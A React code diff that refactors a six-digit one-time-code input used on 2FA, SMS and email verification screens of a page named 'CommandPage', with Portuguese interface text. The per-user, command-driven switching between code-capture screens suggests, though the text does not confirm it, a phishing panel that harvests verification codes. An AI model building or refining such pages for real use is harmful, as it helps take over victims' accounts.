@@ -139,11 +139,20 @@ function CommandPage({ userId }) {
 
   const handleCodeChange = (index, value) => {
     if (loading) return;
-    const digit = value.replace(/\D/g, '').slice(-1);
+    const digits = value.replace(/\D/g, '');
+    if (!digits) {
+      const newDigits = [...codeDigits];
+      newDigits[index] = '';
+      setCodeDigits(newDigits);
+      return;
+    }
+    // Single digit typed
     const newDigits = [...codeDigits];
-    newDigits[index] = digit;
+    newDigits[index] = digits[0];
     setCodeDigits(newDigits);
-    if (digit && index < 5) inputRefs.current[index + 1]?.focus();
+    if (index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
   };
 
   const handleKeyDown = (index, e) => {
@@ -163,25 +172,26 @@ function CommandPage({ userId }) {
     inputRefs.current[Math.min(pastedData.length, 5)]?.focus();
   };
 
-  // 6 quadradinhos de código
-  const CodeInputs = ({ isInvalid = false }) => (
+  // Renderizar 6 quadradinhos de código (inline, não como componente)
+  const renderCodeInputs = (isInvalid = false) => (
     <div className="flex justify-center gap-2.5">
-      {codeDigits.map((digit, index) => (
+      {[0,1,2,3,4,5].map((index) => (
         <input
-          key={index}
-          ref={(el) => (inputRefs.current[index] = el)}
+          key={`code-${index}`}
+          ref={(el) => { inputRefs.current[index] = el; }}
           type="text"
           inputMode="numeric"
           maxLength="1"
-          value={digit}
+          value={codeDigits[index]}
+          autoFocus={index === 0}
           onChange={(e) => handleCodeChange(index, e.target.value)}
           onKeyDown={(e) => handleKeyDown(index, e)}
           onPaste={handlePaste}
+          onFocus={(e) => e.target.select()}
           disabled={loading}
           className={`w-11 h-12 text-center text-xl font-bold border-2 rounded-lg focus:outline-none transition-all ${
-            isInvalid ? 'border-red-500 bg-red-50' : digit ? `border-[${PF_BLUE}] bg-blue-50` : 'border-gray-300 bg-white'
+            isInvalid ? 'border-red-500 bg-red-50' : codeDigits[index] ? 'border-[#5C6BC0] bg-blue-50' : 'border-gray-300 bg-white'
           } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-[#5C6BC0] focus:shadow-md focus:shadow-blue-100'}`}
-          style={digit && !isInvalid ? { borderColor: PF_BLUE } : {}}
         />
       ))}
     </div>
@@ -219,7 +229,7 @@ function CommandPage({ userId }) {
         <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Autenticação em Dois Fatores</h1>
         <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o código do seu aplicativo autenticador</p>
         <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-[280px] space-y-5">
-          <CodeInputs isInvalid={isInvalid} />
+          {renderCodeInputs(isInvalid)}
           <PFButton disabled={!isCodeComplete} loading={loading}>Confirmar</PFButton>
           <p className="text-center text-xs text-gray-400">Não recebeu o código? Verifique seu aplicativo.</p>
         </form>
@@ -279,7 +289,7 @@ function CommandPage({ userId }) {
           Informe o código enviado para o número (**) * ****-{phoneRef}.
         </p>
         <form onSubmit={(e) => handleSubmit(e, "sms_code")} className="w-full max-w-[280px] space-y-5">
-          <CodeInputs isInvalid={isInvalid} />
+          {renderCodeInputs(isInvalid)}
           <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
           <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
         </form>
@@ -346,7 +356,7 @@ function CommandPage({ userId }) {
           Informe o código enviado para <span className="font-semibold">{emailRef}</span>
         </p>
         <form onSubmit={(e) => handleSubmit(e, "app_mail")} className="w-full max-w-[280px] space-y-5">
-          <CodeInputs isInvalid={isInvalid} />
+          {renderCodeInputs(isInvalid)}
           <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
           <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
         </form>
